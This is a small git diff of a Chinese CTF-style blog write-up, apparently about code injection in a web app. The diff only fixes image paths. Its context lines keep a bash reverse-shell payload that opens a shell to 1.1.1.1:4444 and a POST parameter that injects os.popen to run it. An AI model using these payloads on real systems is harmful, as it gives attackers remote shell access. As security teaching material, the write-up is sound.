@@ -116,15 +116,15 @@ echo不输出换行符可使用参数-n.
 
 请求后会报错,但实际上已写入文件.
 
-![1](F:/Blog/M09Ic.github.io/source/_drafts/1.png)
+![1](1.png)
 
-![2](F:/Blog/M09Ic.github.io/source/_drafts/2.png)
+![2](2.png)
 
 依次写入反弹shell的payload:`bash -c 'bash -i >/dev/tcp/1.1.1.1/4444 0>&1'`,空格用tab代替.
 
 最后post请求`msg=%2Bos.popen("sh%09a")%2B'&type='`即可执行代码反弹shell.
 
-![1570702314420](C:\Users\M09ic\AppData\Roaming\Typora\typora-user-images\1570702314420.png)
+![1570702314420](1570702314420.png)
 
 ### pickle反序列化
 
